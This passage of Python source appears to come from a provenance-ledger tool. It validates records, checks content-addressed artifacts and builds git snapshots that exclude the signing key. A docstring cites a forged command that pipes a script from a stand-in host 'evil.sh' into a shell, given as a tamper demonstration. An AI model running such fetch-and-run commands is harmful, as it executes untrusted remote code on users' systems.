    err = _hash_list(d["acceptance_refs"], "acceptance_refs")
    if err:
        return err
    if not _int(d["ts"]):
        return "ts must be an integer (Unix seconds)"
    return None


def _v_execution(d):
    e = _closed(d, ("execution", "id", "intent_id", "executor", "input_state",
                    "output_state", "invocation", "environment", "status",
                    "exit_code", "output", "ts"))
    if e:
        return e
    if not _text(d["id"]):
        return "id must be a non-empty string"
    if not (d["intent_id"] is None or _text(d["intent_id"])):
        return "intent_id must be an intent id or null"
    ex = d["executor"]
    if not isinstance(ex, dict):
        return "executor must be an object"
    err = _closed(ex, ("actor", "runtime"))
    if err:
        return f"executor: {err}"
    if not _text(ex["actor"]):
        return "executor.actor must be a non-empty string"
    if ex["runtime"] not in EXECUTOR_RUNTIMES:
        return (f"executor.runtime {ex['runtime']!r} is not registered (§7.2); "
                "the runtime is what says how `invocation` is interpreted")
    for f in ("input_state", "output_state", "environment"):
        if not _hex64(d[f]):
            return f"{f} must be hex64 (a StateID, §2.2)" if f.endswith("state") \
                   else f"{f} must be hex64 (§2.2.1)"
    inv = d["invocation"]
    if not (isinstance(inv, list) and inv and all(isinstance(s, str) for s in inv)):
        return ("invocation must be a non-empty array of strings — a joined "
                "string cannot reconstruct an argv vector (§2.4)")
    if ex["runtime"] == "shell@v1" and len(inv) != 1:
        return ("shell@v1 takes EXACTLY one invocation element (the script); "
                f"this record has {len(inv)}")
    if d["status"] not in ("exited", "failed", "killed"):
        return "status must be exited | failed | killed (§2.4)"
    code = d["exit_code"]
    if d["status"] == "exited":
        if not _int(code) or not 0 <= code <= 255:
            return "an exited process has an integer exit_code in 0..255"
    elif code is not None:
        return (f"a {d['status']} process never returned a code: exit_code must "
                "be null")
    if not (d["output"] is None or _hex64(d["output"])):
        return ("output must be the hex64 address of the captured-output "
                "artifact, or null where nothing was captured (§2.4)")
    if not _int(d["ts"]):
        return "ts must be an integer (Unix seconds)"
    return None


def _v_effect(d):
    e = _closed(d, ("effect", "id", "execution_id", "kind", "target", "before",
                    "after"), optional=("entities",))
    if e:
        return e
    for f in ("id", "execution_id", "target"):
        if not _text(d[f]):
            return f"{f} must be a non-empty string"
    if d["kind"] not in EFFECT_KINDS:
        return (f"kind {d['kind']!r} is not registered (§7.4); a reader that "
                "meets an unregistered kind cannot tell whether state was added "
                "or removed")
    for f in ("before", "after"):
        if not (d[f] is None or _hex40(d[f])):
            return f"{f} must be a hex40 git blob id or null"
    b, a = d["before"], d["after"]
    if d["kind"] == "file.create" and not (b is None and a is not None):
        return "file.create requires before=null and a non-null after"
    if d["kind"] == "file.delete" and not (a is None and b is not None):
        return "file.delete requires after=null and a non-null before"
    if d["kind"] in ("file.modify", "file.typechange"):
        if b is None or a is None:
            return f"{d['kind']} requires both before and after"
        if b == a:
            return f"{d['kind']} with before == after records no mutation"
    if "entities" in d:
        if not isinstance(d["entities"], list):
            return "entities must be an array"
        if d["entities"]:
            return ("entities is RESERVED in effect 0.1 and must be empty — a "
                    "v0.1 reader must never be handed semantics it will "
                    "silently drop (§2.5)")
    return None


def _v_attribution(d):
    e = _closed(d, ("attribution", "id", "effect_id", "cause", "method",
                    "confidence_ppm", "support"))
    if e:
        return e
    for f in ("id", "effect_id", "cause"):
        if not _text(d[f]):
            return f"{f} must be a non-empty string"
    if d["method"] not in ATTRIBUTION_METHODS:
        return (f"method {d['method']!r} is not registered (§7.6) — a confidence "
                "number means nothing without a named, defined method")
    c = d["confidence_ppm"]
    if not _int(c) or not 0 <= c <= 1000000:
        return "confidence_ppm must be an integer in 0..1000000 (no floats)"
    cap = ATTRIBUTION_METHODS[d["method"]]
    if c > cap:
        return (f"confidence_ppm {c} exceeds the ceiling {cap} registered for "
                f"{d['method']!r} (§7.6): the observer cannot exclude a writer "
                "it did not start, so this method may not claim certainty")
    err = _hash_list(d["support"], "support")
    if err:
        return err
    return None


def _v_claim(d):
    e = _closed(d, ("claim", "id", "subject", "predicate", "evidence",
                    "validation", "proposed_by", "ts"))
    if e:
        return e
    for f in ("id", "predicate", "proposed_by"):
        if not _text(d[f]):
            return f"{f} must be a non-empty string"
    if not _hex64(d["subject"]):
        return "subject must be hex64 (the hash of a claim_subject, §2.8)"
    err = _hash_list(d["evidence"], "evidence")
    if err:
        return err
    v = d["validation"]
    if not isinstance(v, dict):
        return "validation must be an object"
    err = _closed(v, ("runtime", "check", "verdict", "transcript"))
    if err:
        return f"validation: {err}"
    if v["runtime"] in VALIDATION_RESERVED:
        return (f"validation.runtime {v['runtime']!r} is RESERVED in claim 0.1 "
                "(§7.3): a v0.1 verifier without a Σ-GLYPH oracle cannot "
                "evaluate it, so admitting it would make conforming verifiers "
                "disagree")
    if v["runtime"] not in VALIDATION_RUNTIMES:
        return f"validation.runtime {v['runtime']!r} is not registered (§7.3)"
    for f in ("check", "transcript"):
        if not _hex64(v[f]):
            return (f"validation.{f} must be hex64 — the check is EVIDENCE, so "
                    "the record cites the bytes that ran, not a description "
                    "of them")
    if v["verdict"] not in ("pass", "fail"):
        return "validation.verdict must be pass | fail"
    if not _int(d["ts"]):
        return "ts must be an integer (Unix seconds)"
    return None


def _v_claim_subject(d):
    e = _closed(d, ("claim_subject", "predicate", "execution_id", "effects"))
    if e:
        return e
    for f in ("predicate", "execution_id"):
        if not _text(d[f]):
            return f"{f} must be a non-empty string"
    effects = d["effects"]
    if not isinstance(effects, list):
        return "effects must be an array"
    keys = []
    for el in effects:
        if not isinstance(el, dict):
            return "each effects element must be an object"
        err = _closed(el, ("target", "kind", "after"))
        if err:
            return f"effects element: {err}"
        if not _text(el["target"]):
            return "effects[].target must be a non-empty string"
        if el["kind"] not in EFFECT_KINDS:
            return f"effects[].kind {el['kind']!r} is not registered (§7.4)"
        if not (el["after"] is None or _hex40(el["after"])):
            return "effects[].after must be a hex40 git blob id or null"
        keys.append((el["target"], el["kind"]))
    if keys != sorted(keys):
        return ("effects must be sorted by (target, kind): array order is "
                "significant in JCS, and this array's hash IS the decision's "
                "subject (§2.8)")
    if len(set(keys)) != len(keys):
        return "effects must not repeat a (target, kind) pair"
    return None


VALIDATORS = {
    "artifact": _v_artifact,
    "attribution": _v_attribution,
    "claim": _v_claim,
    "claim_subject": _v_claim_subject,
    "effect": _v_effect,
    "environment_probe": _v_environment_probe,
    "execution": _v_execution,
    "intent": _v_intent,
    "state": _v_state,
    "toolchain_probe": _v_toolchain_probe,
}


def hash_citations(doc, rtype):
    """Every hex64 address a valid record CITES (SPEC §6.2).

    Only content addresses: an event id names a record whose own address this
    reader does not know, so a citation by id cannot be resolved against the
    unreadable set and is deliberately not guessed at here."""
    out = set()

    def add(*vals):
        for v in vals:
            if isinstance(v, str) and HEX64.match(v):
                out.add(v)
            elif isinstance(v, list):
                add(*v)

    if rtype == "execution":
        add(doc["input_state"], doc["output_state"], doc["output"])
    elif rtype == "claim":
        add(doc["subject"], doc["evidence"], doc["validation"]["check"],
            doc["validation"]["transcript"])
    elif rtype == "intent":
        add(doc["acceptance_refs"])
    elif rtype == "attribution":
        add(doc["support"])
    elif rtype == "artifact":
        add(doc["hash"])
    return out


def validate_record(doc):
    """SPEC §6.2 -> (outcome, type, version, detail).

    outcome ∈ {valid, invalid, unsupported-version, unknown-type, legacy,
    not-a-record}. `unsupported-version` and `unknown-type` are DISTINCT from
    both valid and invalid and callers must keep them so: collapsing them into
    "valid" reads a record this code does not understand, and collapsing them
    into "invalid" calls a future record corrupt, which makes a
    forward-compatible writer indistinguishable from an attacker."""
    outcome, t, v, detail = classify_record(doc)
    if outcome != "record":
        return outcome, t, v, detail
    err = VALIDATORS[t](doc)
    return ("invalid" if err else "valid"), t, v, err


# ---------- SPEC §6.4 legacy-read mode ----------
# Stores written before the record formats were pinned exist, and this is the
# read side of the migration. Three rules from §6.4 hold here and are the whole
# design:
#   * legacy records are interpreted under the LEGACY rules, never the v0.1
#     ones. A legacy execution's `before_tree` is a git TREE id, and putting it
#     in an `input_state` column without saying so would teach every downstream
#     reader that a StateID is 40 characters long;
#   * everything derived from one is MARKED legacy in the projection (the
#     `format` column) and in `oaip log`; and
#   * nothing is rewritten. The record is addressed by the hash of its own
#     bytes, the Warrant store cites that address, and a "migration" that
#     rewrites it produces a different record at a different address while
#     breaking the citation.
# The writer emits only v0.1 (§6.4: migration is read-side).
LEGACY_FORMAT = "oaip_record@v1"
_LEGACY_SHAPES = {
    "intent@v1": ("id", "description", "parent", "ts"),
    "execution@v1": ("id", "intent", "command", "exit_code", "before_tree",
                     "after_tree", "env_fp", "stdout", "ts", "effects"),
    "claim@v1": ("id", "execution", "predicate", "check", "check_exit",
                 "supported", "transcript", "subject", "ts"),
    "subject:claim@v1": ("predicate", "execution", "effects"),
}


def legacy_shape_ok(doc, tag):
    """Is this really the pre-0.1 record it claims to be?

    A legacy record gets no schema pass just for being old: reading a document
    whose shape was never checked is how the projection came to assert whatever
    members happened to be present. What it gets is the OLD schema, applied as
    strictly as the new one."""
    want = _LEGACY_SHAPES.get(tag)
    if want is None:
        return f"{tag} is not a record type this legacy reader knows"
    missing = [f for f in want if f not in doc]
    if missing:
        return (f"a legacy {tag} without {', '.join(missing)} is not a "
                f"{tag}")
    return None


def read_artifact(path: Path):
    """Load an artifact, refusing bytes that do not hash to their own address.

    THE DEFECT THIS CLOSES (found 2026-07-30)
    -----------------------------------------
    `.oaip/artifacts` IS the canonical layer: SPEC §5 ends "the projection is
    disposable; the content-addressed causal graph is the truth." Every reader
    used bare `json.loads(path.read_bytes())` and never recomputed the address,
    so editing a file in place silently rewrote the truth. Demonstrated: an
    execution record's `command` was changed to `sh -c curl evil.sh|sh`,
    `rebuild` reported success, and the projection asserted the forged command
    while the file still sat under its original name. Content-addressed storage
    whose reader never checks the address is not content-addressed; it is a
    directory of files with long names.

    Returns (doc, error). `doc` is None when the artifact must not be used.

    A DIRECTORY at an artifact's address is not an artifact: `read_bytes()` raised
    IsADirectoryError and the traceback replaced every diagnosis this function
    exists to give (F12, 2026-07-30). Any OSError is reported as what it is — an
    unreadable path — because "the canonical layer contains something that is not
    a file" is a real state of the world, and a refusal is a decision while a
    traceback is an accident.
    """
    try:
        raw = path.read_bytes()
    except OSError as e:
        kind = "a directory" if path.is_dir() else "unreadable"
        return None, (f"{path.name[:12]}: {kind} at an artifact address "
                      f"({type(e).__name__}) — not an artifact")
    if path.name != sha256(raw):
        return None, (f"{path.name[:12]}: bytes hash to {sha256(raw)[:12]} — "
                      "artifact does not match its own address")
    try:
        doc = loads_ijson(raw)
    except json.JSONDecodeError:
        # A transcript or a plain blob, not a record. Must be caught BEFORE
        # ValueError: JSONDecodeError subclasses it, so the wider clause first
        # would report every non-JSON artifact as a canonicalization failure.
        return None, None
    except ValueError as e:
        return None, f"{path.name[:12]}: not canonical I-JSON: {e}"
    return doc, None


def canon(obj) -> bytes:
    """RFC 8785 (JCS) I-JSON, EXACTLY per Warrant SPEC §4 (SPEC §1): sorted keys,
    compact separators, UTF-8, integers only, raw non-ASCII (ensure_ascii=False).
    A record's identity is SHA-256 of these bytes; every OAIP implementation MUST
    agree on them, so this must match Warrant's canonicalization byte-for-byte."""
    return json.dumps(obj, sort_keys=True, separators=(",", ":"),
                      ensure_ascii=False).encode("utf-8")


def put_artifact(data: bytes, kind: str) -> str:
    ART.mkdir(parents=True, exist_ok=True)
    h = sha256(data)
    p = ART / h
    if not p.exists():
        p.write_bytes(data)
    con = db()
    con.execute("INSERT OR IGNORE INTO artifacts(hash, kind, size) VALUES (?,?,?)",
                (h, kind, len(data)))
    con.commit()
    return h


def kid() -> str:
    # time-sortable-ish id (uuid7 not in stdlib; use ts + short uuid)
    return f"{int(time.time()*1000):013d}-{uuid.uuid4().hex[:8]}"


# ---------- git plumbing: the workspace snapshot ----------
def git(*args, **kw) -> str:
    r = subprocess.run(["git", *args], capture_output=True, text=True, **kw)
    if r.returncode != 0:
        raise RuntimeError(f"git {' '.join(args)}: {r.stderr.strip()}")
    return r.stdout.strip()


def symlinked_ledger_target():
    """The repo-relative path `.oaip` points at, when `.oaip` is a SYMLINK.

    THE DEFECT THIS CLOSES (F6, 2026-07-30, second adversarial round). The ledger
    exclusion is by NAME, and a symlink gives the same directory a second name:
    `ln -s ledgerstore .oaip` made `git add -A` add the REAL path, which
    `**/.oaip/**` does not match. Measured before this: the snapshot tree carried
    `ledgerstore/dev.key`, `ledgerstore/ledger.db`, `ledgerstore/trust.json`,
    `ledgerstore/tmp.index` and the key's blob was in `.git/objects` — the whole
    original leak, one `ln -s` away. `oaip init` refuses to run into a symlinked
    ledger, but a symlink can be made afterwards, so the snapshot must not depend
    on init having refused.

    Returns None when `.oaip` is not a symlink, or when the target lies outside
    the repository (where `git add` would not have added it anyway)."""
    if not OAIP.is_symlink():
        return None
    try:
        top = Path(git("rev-parse", "--show-toplevel")).resolve()
        return OAIP.resolve().relative_to(top).as_posix()
    except (RuntimeError, ValueError, OSError):
        return None


_LEDGER_PATHSPEC = (":(top,glob,icase)**/.oaip/**", ":(top,glob,icase)**/.oaip")
_WARNED_EXCLUDED = set()


def excluded_non_ledger():
    """Worktree paths the ledger exclusion drops that are NOT this ledger.

    Enumerated with `git ls-files`, which writes NOTHING to the object database —
    the whole point of the exclusion is that `git add` would have written the
    signing key there, so the detector must not do the thing it is detecting.

    Membership of the ledger is decided by INODE (`os.path.samestat`), not by
    spelling: on a case-insensitive filesystem `.OAIP/dev.key` really is this
    ledger's key and must not be reported as a lost user file, while
    `src/.Oaip/config.yml` is a user file and must be. A NESTED ledger (`oaip
    init` run in a subdirectory) is not this ledger and is still a ledger, so it
    is recognised by its contents rather than announced as a lost file.

    `--exclude-standard` is deliberately NOT passed. `oaip init` writes `.oaip/`
    into the repo's .gitignore, and git matches gitignore case-insensitively on a
    case-insensitive filesystem — so the very paths this warning exists for would
    be filtered out of the enumeration by this tool's own doing, on the platform
    where the case-folding hole is easiest to hit."""
    try:
        top = Path(git("rev-parse", "--show-toplevel")).resolve()
        listed = git("-C", str(top), "ls-files", "-c", "-o", "--full-name",
                     "--", *_LEDGER_PATHSPEC)
    except (RuntimeError, OSError):
        return []                       # not a repo / git unavailable: not ours
    try:
        store = os.stat(OAIP)           # follows a symlinked ledger, on purpose
    except OSError:
        store = None
    # What a ledger directory contains. `init` creates all of these; any one is
    # enough to say "this is somebody's ledger, not a user file that happens to
    # be spelled .oaip".
    LEDGERISH = {"dev.key", "dev.key.pub", "ledger.db", "trust.json",
                 "store.json", "warrants", "artifacts"}

    def a_ledger(rel):
        parts = rel.split("/")
        for i, comp in enumerate(parts):
            if comp.lower() != ".oaip":
                continue
            d = top.joinpath(*parts[:i + 1])
            try:
                if store and os.path.samestat(os.stat(d), store):
                    return True         # this ledger
                if any((d / n).exists() for n in LEDGERISH):
                    return True         # another ledger (e.g. a nested one)
            except OSError:
                pass
        return False

    return sorted({p for p in listed.splitlines() if p and not a_ledger(p)})


def warn_excluded_non_ledger():
    """Say which non-ledger paths this snapshot will not contain, once each."""
    lost = [p for p in excluded_non_ledger() if p not in _WARNED_EXCLUDED]
    if not lost:
        return
    _WARNED_EXCLUDED.update(lost)
    shown = ", ".join(lost[:5]) + (f" (+{len(lost) - 5} more)"
                                   if len(lost) > 5 else "")
    print(f"warning: {len(lost)} path(s) are left out of this snapshot but are "
          f"NOT this ledger: {shown}. The ledger exclusion matches any path "
          "component that case-folds to `.oaip`, at any depth, on any "
          "filesystem — it must, because on a case-insensitive filesystem this "
          "ledger's own directory can be spelled `.OAIP`. Those paths are "
          "therefore UNOBSERVED: no snapshot records them and no effect over "
          "them is attributed. Rename them if they should be observed.",
          file=sys.stderr)


def workspace_snapshot() -> str:
    """Content-addressed tree of the FULL worktree (tracked + staged + untracked),
    built in a throwaway index so `git log` is never touched. This is the honest
    `before_state`/`after_state`, unlike HEAD.

    `.oaip/` is NEVER part of the snapshot. Until 2026-07-30 it was: `git add -A`
    into the throwaway index wrote `.oaip/dev.key` — the Ed25519 SIGNING KEY —
    as a loose blob into `.git/objects` of any repo whose .gitignore did not
    already exclude `.oaip/` (a fresh `git init` + `oaip init` was enough).
    A throwaway index does not mean throwaway objects: `git add` writes blobs
    to the object database, where they sit recoverable by hash and travel with
    any clone/push that reaches them. The observer must not exfiltrate its own
    key custody into the thing it observes; nor is the ledger/store part of the
    observed workspace — a snapshot that contains the observation machinery
    changes whenever the machinery does, which is the observer effect, not
    provenance. The exclusion is done here with a pathspec (not .gitignore) so
    it does not depend on user configuration.

    The pathspecs are REPO-ROOTED, DEPTH-AGNOSTIC and CASE-INSENSITIVE, and all
    three properties are load-bearing (2026-07-30 adversarial review, two rounds,
    fresh-context Claude-family reviewer — every hole reproduced):
      * The first fix used `-- . ':(exclude).oaip'`. `:(exclude).oaip` anchors
        at the pathspec root, so a NESTED ledger (`sub/.oaip/dev.key`, from an
        `oaip init` run in a subdirectory) still landed in `.git/objects` —
        the same key leak, one directory down. `:(top,exclude,glob)**/.oaip/**`
        excludes the ledger at ANY depth (a leading `**/` matches zero or more
        components, so the top level is covered too).
      * Both pathspecs were cwd-relative. Run from `sub/`, `-- .` silently
        NARROWED the snapshot from the whole worktree to the cwd subtree (a
        wrapped command mutating anything outside cwd became unobserved), and
        `git rm --cached -- .oaip` referred to `sub/.oaip`, so a HEAD-tracked
        root `.oaip` survived into every tree written here. `:/` (add) and
        `:(top,…)` (both) resolve from the repository root regardless of cwd.
      * `:(top,exclude,glob)` matched CASE-SENSITIVELY, and this repository's own
        development platform (macOS/APFS) is case-INSENSITIVE. `OAIP.mkdir(
        exist_ok=True)` therefore succeeds into a pre-existing `.OAIP`, every
        later `.oaip/...` write lands there, and git reports the REAL on-disk
        name — which `**/.oaip/**` does not match. Measured on macOS before this
        fix: with `.OAIP/dev.key` HEAD-tracked, the snapshot tree listed
        `.OAIP/dev.key` and the key's blob was in `.git/objects`; with an
        untracked `.OAIP` and a DIRECTORY named `.gitignore` (so wall 2 only
        warns), the tree gained `.OAIP/dev.key`, `.OAIP/ledger.db`,
        `.OAIP/tmp.index` and `.OAIP/tmp.index.lock`. `icase` closes it.
    Verified against git 2.50: top-level and nested, from root and from a
    subdirectory, with and without a HEAD-tracked `.oaip`, and in both letter
    cases on a case-insensitive filesystem.

    WHAT `icase` COSTS, SAID PLAINLY (C1-F1, third adversarial round). The
    docstring used to claim the cost applied "on a case-SENSITIVE filesystem" to
    "a directory deliberately named `.OAIP`". That was wrong in every part: the
    exclusion drops ANY path whose component case-folds to `.oaip`, at ANY depth,
    on ANY filesystem, whoever named it and whyever. `src/.Oaip/config.yml` — a
    user's own file, nothing to do with this ledger — vanished from every
    snapshot with no warning at all: an unannounced hole in the observation, in
    the tool whose entire job is to observe. The exclusion stays (the safe
    direction for a signing key is to leave things out), but it no longer stays
    QUIET: `excluded_non_ledger()` names every excluded path that is not this
    ledger's own directory, compared by inode so `.OAIP/dev.key` on a
    case-insensitive filesystem is correctly recognised as the ledger itself."""
    tmp_index = OAIP / "tmp.index"
    env = dict(os.environ, GIT_INDEX_FILE=str(tmp_index.resolve()))
    warn_excluded_non_ledger()
    # A SYMLINKED ledger has a second name, and the exclusion is by name (F6).
    # Say so loudly — the arrangement is very likely a mistake — and exclude the
    # real path too, so saying so is not the only protection.
    target = symlinked_ledger_target()
    extra_add, extra_rm = [], []
    # A RELOCATED TRUST ROOT CAN BE RELOCATED THE WRONG WAY. `--trust-root
    # ./keys` puts the signing key back inside the observed repository under a
    # name no exclusion here mentions — the same shape as the symlinked-ledger
    # leak (F6), reached by an operator's flag instead of an `ln -s`. Exclude it
    # by its own path and say so; the exclusion is by NAME either way, so the
    # warning is not decoration.
    if trust_root_mode() == "workspace" and not same_path(TRUST_ROOT, OAIP):
        try:
            rel = os.path.relpath(os.path.realpath(TRUST_ROOT),
                                  git("rev-parse", "--show-toplevel"))
        except (RuntimeError, OSError, ValueError):
            rel = None
        if rel and not rel.startswith(".."):
            print(f"warning: this ledger's trust root is {TRUST_ROOT}, inside "
                  "the observed repository. The signing key is therefore a file "
                  "in the workspace being snapshotted; it is excluded from this "
                  "snapshot by path, but nothing keeps it out of the operator's "
                  "own commits. Move it out: `oaip trust-root --migrate`.",
                  file=sys.stderr)
            extra_add += [f":(top,exclude,glob,icase){rel}/**",
                          f":(top,exclude,glob,icase){rel}"]
            extra_rm += [f":(top,glob,icase){rel}/**", f":(top,glob,icase){rel}"]
    if target:
        print(f"warning: {OAIP} is a SYMLINK to {target}; the ledger and its "
              "signing key live outside the path this snapshot excludes by name. "
              f"Excluding {target} as well — but move the ledger back inside "
              f"{OAIP} rather than relying on this.", file=sys.stderr)
        extra_add += [f":(top,exclude,glob,icase){target}/**",
                      f":(top,exclude,glob,icase){target}"]
        extra_rm += [f":(top,glob,icase){target}/**", f":(top,glob,icase){target}"]
    # seed the throwaway index from HEAD if it exists, else empty, then add all
    subprocess.run(["git", "read-tree", "HEAD"], env=env, capture_output=True)
    subprocess.run(["git", "add", "-A", "--", ":/",
                    ":(top,exclude,glob,icase)**/.oaip/**",
                    ":(top,exclude,glob,icase)**/.oaip", *extra_add],
                   env=env, capture_output=True)
    # If HEAD itself tracks .oaip (a user committed it before init learned to
    # gitignore it), read-tree seeded those entries; drop them so no tree this
    # function writes ever contains the key or the store — at any depth, from
    # any cwd.
    subprocess.run(["git", "rm", "-r", "-q", "--cached", "--ignore-unmatch",
                    "--", *_LEDGER_PATHSPEC, *extra_rm],
                   env=env, capture_output=True)
    tree = subprocess.run(["git", "write-tree"], env=env, capture_output=True, text=True).stdout.strip()
    tmp_index.unlink(missing_ok=True)
    return tree


# ---------- the fingerprints, per SPEC §2.2.1 / §2.2.2 ----------
# WHAT THIS REPLACED, AND WHY IT COULD NOT STAY
# ---------------------------------------------
# The old `env_fingerprint()` hashed `{uname -sm, git --version, python
# --version}` under no declared profile, and SPEC §2.2 named the field without
# ever saying what went into it. Two consequences, both interop-fatal:
#   * a second implementation could not compute the same StateID, so no third
#     party could produce an interoperable State record — the review's
#     deficiency #5, and the reason the whole record layer was untestable
#     against anything but itself; and
#   * a Go or Rust implementation hashing ITS OWN runtime version would have
#     disagreed with this one about the same host, by construction.
# So the probe set is a REGISTERED PROFILE (§7.5) carried inside the hashed
# record, the probes are specified as commands rather than as host APIs (`uname
# -s` says `Darwin` where a Python API says `darwin`), the implementation's own
# interpreter is deliberately NOT probed, and §2.2.1 states in as many words
# which five variables the profile covers and that everything else can change
# what a command does without changing this number.
_TRIM = "\t\n\r "


def _uname(flag: str) -> str:
    """A §2.2.3 capture: stdout of `uname <flag>`, trailing ASCII space trimmed.

    Fails CLOSED rather than substituting anything. A replacement character
    chosen here and a different one chosen by a second implementation are two
    fingerprints for one environment, which is the defect this section exists
    to close."""
    try:
        r = subprocess.run(["uname", flag], capture_output=True)
    except OSError as e:
        sys.exit(f"cannot run `uname {flag}` ({e}) — SPEC §2.2.3 defines this "
                 "observer's `os`/`arch` as that command's output, so without it "
                 "no State can be honestly fingerprinted on this host")
    if r.returncode != 0:
        sys.exit(f"`uname {flag}` exited {r.returncode}; refusing to invent an "
                 "environment fingerprint")
    try:
        value = r.stdout.decode("utf-8").rstrip(_TRIM)
    except UnicodeDecodeError:
        sys.exit(f"`uname {flag}` did not emit UTF-8; SPEC §2.2.1 refuses a "
                 "fingerprint rather than substituting a replacement character, "
                 "because two implementations would substitute differently")
    if not value:
        sys.exit(f"`uname {flag}` printed nothing")
    return value


def environment_probe():
    """(record, hex64) — SPEC §2.2.1, profile `posix-base@v1`."""
    env_bytes = getattr(os, "environb", None)
    variables = {}
    for name in ENV_PROFILE_VARS:
        if env_bytes is not None:
            raw = env_bytes.get(name.encode("ascii"))
            if raw is None:
                variables[name] = None          # unset — NOT "" (§2.2.1)
                continue
            try:
                variables[name] = raw.decode("utf-8")
            except UnicodeDecodeError:
                sys.exit(f"${name} is not valid UTF-8; SPEC §2.2.1 refuses to "
                         "fingerprint an environment it cannot encode exactly")
        else:                                   # no os.environb (non-POSIX)
            variables[name] = os.environ.get(name)
    rec = {"environment_probe": "0.1", "profile": "posix-base@v1",
           "os": _uname("-s"), "arch": _uname("-m"), "vars": variables}
    return rec, sha256(canon(rec))


def toolchain_probe():
    """(record, hex64) — SPEC §2.2.2, profile `posix-base@v1`.

    One probe. A profile that listed every tool this implementation happens to
    use would be a profile only this implementation could reproduce."""
    tools = []
    for spec in TOOLCHAIN_PROFILE_TOOLS:
        argv = list(spec["argv"])
        try:
            r = subprocess.run(argv, capture_output=True)
        except FileNotFoundError:
            status, out = "absent", None
        except OSError:
            status, out = "error", b""
        else:
            status = "ok" if r.returncode == 0 else "error"
            out = r.stdout
        tools.append({"name": spec["name"], "argv": argv, "status": status,
                      "stdout_sha256": None if out is None else sha256(out)})
    rec = {"toolchain_probe": "0.1", "profile": "posix-base@v1", "tools": tools}
    return rec, sha256(canon(rec))


def snapshot_state():
    """Build, STORE and return (StateID, state record) — SPEC §2.2.

    The probe records are stored too, and that is not housekeeping: §2.2.4 gives
    a verifier three outcomes, and without the probe record the only one
    available to any reader is `unreproducible`. A fingerprint whose inputs
    nobody can see is an opaque number wearing the word "fingerprint"."""
    tree = workspace_snapshot()
    try:
        commit = git("rev-parse", "HEAD")
    except RuntimeError:
        commit = None                   # a repository with no commit yet
    if commit is not None and not HEX40.match(commit):
        commit = None
    envr, envh = environment_probe()
    toolr, toolh = toolchain_probe()
    put_artifact(canon(envr), artifact_kind("environment_probe"))
    put_artifact(canon(toolr), artifact_kind("toolchain_probe"))
    state = {"state": "0.1", "repo_commit": commit, "worktree_tree": tree,
             "env_fingerprint": envh, "toolchain_fingerprint": toolh}
    return put_artifact(canon(state), "record:state"), state


def default_actor() -> str:
    """A best-effort `<user>@<host>` for the CLI's `--actor` default.

    SPEC §8 is explicit that every actor string in an OAIP record is
    UNAUTHENTICATED, so requiring the operator to type one would move the
    fiction rather than remove it; the OS user and host are at least what this
    process actually ran as. `oaip do` still requires it, because that path
    files a signed warrant and the name goes into somebody's decision."""
    try:
        import getpass
        import socket
        return f"{getpass.getuser()}@{socket.gethostname()}"
    except Exception:                   # a container with no passwd entry, etc.
        return "unknown@unknown"


# git's diff-tree status letters -> registered §7.4 effect kinds.
_EFFECT_KIND = {"A": "file.create", "M": "file.modify", "D": "file.delete",
                "T": "file.typechange"}


def effects_between(before_tree: str, after_tree: str):
    """Per-file mutations as §2.5 (target, kind, before, after) via diff-tree."""
    out = git("diff-tree", "-r", "--no-commit-id", before_tree, after_tree)
    for line in out.splitlines():
        if not line:
            continue
        meta, path = line.split("\t", 1)
        _, _, before_blob, after_blob, status = meta.split()[:5]
        zero = "0" * 40
        kind = _EFFECT_KIND.get(status[0])
        if kind is None:
            # §7.4 is a CLOSED registry, so there is no honest way to write this
            # mutation down. Refusing names the gap; inventing a kind would put a
            # value in the ledger that no conforming reader can interpret.
            sys.exit(f"git reported diff status {status!r} for {path!r}, which "
                     "has no registered OAIP effect kind (SPEC §7.4). Refusing "
                     "to record a mutation this format cannot express.")
        yield {
            "target": path,
            "kind": kind,
            "before": None if before_blob == zero else before_blob,
            "after": None if after_blob == zero else after_blob,
        }


# ---------- ledger (SQLite projection) ----------
# What every table must carry for this build to read the projection at all. A
# ledger.db written by the pre-0.1 code has `intents.description` where this one
# has `intents.objective`, so every read command would die with a bare
# `sqlite3.OperationalError: no such column` — a traceback where the answer is
# one sentence long, and the same defect class this file has closed four times.
_SCHEMA_PROBE = {"intents": "objective", "executions": "invocation",
                 "claims": "verdict", "states": "worktree_tree"}


def projection_is_current(con) -> bool:
    for table, column in _SCHEMA_PROBE.items():
        try:
            cols = {r[1] for r in con.execute(f"PRAGMA table_info({table})")}
        except sqlite3.Error:
            return False
        if column not in cols:
            return False
    return True


def db(path=None, create=False):
    # An uninitialised (or blocked) ledger is a DIAGNOSIS. `sqlite3.connect`
    # raises a bare `OperationalError: unable to open database file` when the
    # parent directory is missing or is not a directory, and that traceback was
    # every command's answer to "there is no ledger here" — same defect class as
    # the FileExistsError at `.oaip` (C1-F2).
    if path is None and not create:
        ensure_oaip_dir_readable()
        if not DB.is_file():
            sys.exit(f"no ledger at {DB} — run `oaip init` in this repository "
                     "first")
    con = sqlite3.connect(path or DB)
    con.execute("PRAGMA foreign_keys=ON")
    # Wait for a writer instead of raising. A concurrent `accept` and `rebuild`
    # used to abort with an uncaught sqlite3.OperationalError and LOSE the insert
    # (F10, 2026-07-30); the lock below is the real serialisation, this is the
    # backstop for every other command that touches the projection.
    con.execute("PRAGMA busy_timeout=10000")
    if path is None and not create and not projection_is_current(con):
        con.close()
        sys.exit(f"the projection at {DB} was written by an older OAIP and its "
                 "columns are the pre-0.1 record's, not SPEC §2's. Nothing is "
                 "lost and nothing needs converting: the projection is "
                 "DISPOSABLE by §5 and the canonical layer is untouched. Run "
                 "`oaip rebuild` to derive a current one — it reads pre-0.1 "
                 "records too (§6.4) and marks every row it derives from them.")
    return con


@contextlib.contextmanager
def store_lock():
    """Serialise the commands that MUTATE the projection.

    THE DEFECT THIS CLOSES (F10, 2026-07-30, second adversarial round). `rebuild`
    deleted `ledger.db` and rebuilt it in place, with nothing excluding a second
    rebuild. Measured: four concurrent `oaip rebuild` runs produced FOUR identical
    acceptance edges for ONE store record (there was no UNIQUE constraint either,
    so nothing downstream noticed) and, depending on timing, a FileNotFoundError
    traceback from `DB.unlink()` racing another process's unlink. A concurrent
    `accept` + `rebuild` raised an uncaught sqlite3.OperationalError and lost the
    insert. Three changes together: this lock, `UNIQUE(claim_id, warrant_id)` on
    the edge, and building the new projection under a temporary name and
    `os.replace`-ing it into place, so no window exists in which the projection is
    absent.

    Advisory `flock` on `.oaip/lock` — inside the ledger, so the exclusion
    pathspecs already keep it out of every snapshot. On a platform without
    `fcntl` the lock degrades to nothing rather than failing; the UNIQUE
    constraint and the atomic rename still hold there."""
